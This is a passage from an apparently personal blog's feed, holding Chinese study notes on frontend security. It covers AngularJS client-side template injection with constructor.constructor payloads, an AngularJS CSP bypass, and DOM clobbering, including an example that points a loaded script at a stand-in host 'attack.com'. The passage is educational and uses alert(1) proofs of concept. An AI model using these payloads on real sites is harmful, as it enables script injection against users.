    <category term="域渗透" scheme="https://kaikaix.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="python" scheme="https://kaikaix.github.io/tags/python/"/>
    
    <category term="域渗透" scheme="https://kaikaix.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>刷题3</title>
    <link href="https://kaikaix.github.io/2023/10/14/%E5%88%B7%E9%A2%983/"/>
    <id>https://kaikaix.github.io/2023/10/14/%E5%88%B7%E9%A2%983/</id>
    <published>2023-10-14T15:07:08.000Z</published>
    <updated>2024-01-12T03:23:29.534Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="b5ce060abdfddfaba9dc54e30d5de89f62baeccfc6619c7bf845b2d9554901dd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全9-CSTI（笔记）</title>
    <link href="https://kaikaix.github.io/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A89-CSTI%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A89-CSTI%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-13T13:19:08.000Z</published>
    <updated>2023-10-25T20:19:42.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前端的SSTI，也就是C就是client。这篇没有太多可记的点，想深入又太深了，只能讲些较浅的。</p><ul><li><a href="https://aszx87410.github.io/beyond-xss/ch3/csti/">https://aszx87410.github.io/beyond-xss/ch3/csti/</a><span id="more"></span></li></ul><h1 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h1><p>在模板中，因为无法存取到window，就不存在<code>alert</code>，那如果想弹窗应该怎么办。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><br>可以用上面的代码去创建一个匿名函数去执行<code>alert</code></p><blockquote><p><code>constructor.constructor == Function</code> 这两个是等价的</p></blockquote><p>在刚开始的版本可以通过这种创建匿名函数的方式去执行任意js，后来有过滤就不行了，但是过滤不断被绕过，到最后angularjs就不在把这个视为漏洞，直接取消了sandbox，angularjs觉得模版可控才是漏洞的根源。</p><p>在angularjs 1.x的版本中，直接加上<code>ng-app</code>就可以使用了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123; constructor.constructor(&quot;alert(1)&quot;)() &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在一些时候，前端开发与后端开发不一致就可能导致漏洞的产生<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    Hello, <span class="meta">&lt;?php echo htmlspecialchars($_GET[&#x27;name&#x27;]) ?&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>就比如上面的代码，后端以为没问题了，但是直接请求<br><code>name=constructor.constructor(&quot;alert(1)&quot;)()</code> ，就行了，虽然引号会被转义，但是不影响他的模板解析</p><p><code>ng-init</code> 也允许代码的执行<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-init</span>=<span class="string">&quot;constructor.constructor(&#x27;alert(1)&#x27;)()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>同时他能用在class中<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ng-init:constructor.constructor(&#x27;alert(1)&#x27;)()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>因为这个特性，导致了微软通讯软件的rce漏洞，详细可看<br><a href="https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=12">https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=12</a></p><h1 id="AngularJS-CSP-Bypass"><a href="#AngularJS-CSP-Bypass" class="headerlink" title="AngularJS CSP Bypass"></a>AngularJS CSP Bypass</h1><p>先看看代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://cdnjs.cloudflare.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">autofocus</span> <span class="attr">ng-focus</span>=<span class="string">$event.composedPath()|orderBy:</span>&#x27;(<span class="attr">z</span>=<span class="string">alert)(1)</span>&#x27;&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>可以看到这个CSP规则只允许了 <a href="https://cdnjs.cloudflare.com，而且没有允许unsafe-eval，那么他却可以弹窗。">https://cdnjs.cloudflare.com，而且没有允许unsafe-eval，那么他却可以弹窗。</a><br>这是因为在AngularJS中，他自己实现了一套类似eval的东西，所以就可以执行任意代码。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这应该就是能记的部分知识点了，但是想要更深入，我觉得需要去了解AngularJS框架，或者react什么的框架源码才行，这对我来说就没什么必要了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前端的SSTI，也就是C就是client。这篇没有太多可记的点，想深入又太深了，只能讲些较浅的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://aszx87410.github.io/beyond-xss/ch3/csti/&quot;&gt;https://aszx87410.github.io/beyond-xss/ch3/csti/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="https://kaikaix.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="https://kaikaix.github.io/tags/javascript/"/>
    
    <category term="xss" scheme="https://kaikaix.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全8-DOM Clobbering（笔记）</title>
    <link href="https://kaikaix.github.io/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-12T18:08:21.000Z</published>
    <updated>2023-11-01T09:42:09.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一章的攻击手法是通过改变DOM，然后js会对DOM进行操作造成的漏洞，干解释还是太干燥了，还是上代码吧</p><ul><li><a href="https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/">https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/</a><span id="more"></span></li></ul><h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><p>在讲DOM Clobbering之前，先得了解什么叫做window<br><a href="https://www.w3schools.com/js/js_window.asp">https://www.w3schools.com/js/js_window.asp</a><br>这篇文章有简单的介绍<br>在一个窗口下，所有的全局javascript对象，都归到window底下，也就是平时的什么<code>alert</code>，其实就是<code>window.alert</code><br>可以在浏览器控制台自己输入下面的代码去验证<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert == <span class="variable language_">window</span>.<span class="property">alert</span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p><p>详细的介绍可以看看这篇<br><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window">https://developer.mozilla.org/en-US/docs/Web/API/Window</a><br><a href="https://www.jianshu.com/p/e5ca92d68daa">https://www.jianshu.com/p/e5ca92d68daa</a></p><h1 id="操作带id的tag"><a href="#操作带id的tag" class="headerlink" title="操作带id的tag"></a>操作带id的tag</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    // TODO: add click event listener to button</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上面的代码应该怎么对这个button进行操作呢，比如让他弹窗。<br>下面给出代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>)</span><br><span class="line">  .<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><br>但是其实并不需要<code>document.getElementById</code>，<code>window.btn</code>也可以直接获取到，然后因为在window下面，所以可以直接用<code>btn</code>访问</p><p>所以直接用下面的代码就行了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="property">onclick</span>=<span class="function">()=&gt;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br>根据官方文档 <a href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object">https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object</a><br><code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code>这几个标签的<code>name</code>属性也是可以被window直接获取的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">name</span>=<span class="string">&quot;d&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p><p>按理来说的话 <code>iframe</code> 标签应该也算是有这种特性<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="DOM-Clobbering入门"><a href="#DOM-Clobbering入门" class="headerlink" title="DOM Clobbering入门"></a>DOM Clobbering入门</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    你的留言：<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;TEST_SCRIPT_SRC&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://attack.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// load test script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = <span class="variable language_">window</span>.<span class="property">TEST_SCRIPT_SRC</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样子<code>script.src = window.TEST_SCRIPT_SRC</code>就会加载到a标签的href了，这里为什么不会把<code>&lt;a id=&quot;TEST_SCRIPT_SRC&quot; href=&quot;http://attack.com&quot;&gt;&lt;/a&gt;</code>赋值给<code>script.src</code>呢，这里的实际操作其实是<br><code>script.src = TEST_SCRIPT_SRC.toString()</code><br>这里有一个小trick，当标签是<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>，toString()会返回他们的href</p><p>当变量已经存在的时候，就无法通过id进行覆盖了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    TEST_MODE = 1</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="多层的DOM-Clobbering"><a href="#多层的DOM-Clobbering" class="headerlink" title="多层的DOM Clobbering"></a>多层的DOM Clobbering</h1><p>在上一节只是覆盖单个变量，当需要覆盖对象应该如何操作，比如覆盖掉<code>config.isTest</code>，有几种方法进行覆盖</p><ol><li><p>form</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config) // <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isTest) // <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isProd) // <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方法有一种缺陷，无法使用上一节讲的<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>标签进行toString的覆盖，只能说是覆盖<code>config.isTest.value</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;enviroment&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">enviroment</span>.<span class="property">value</span>) <span class="comment">// test</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HTMLCollection<br>这种方法在firefox上不可用，只能在chrome上用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://123&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://huli.tw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当有两个相同的id的时候，就会生成<code>HTMLCollection</code><br><img 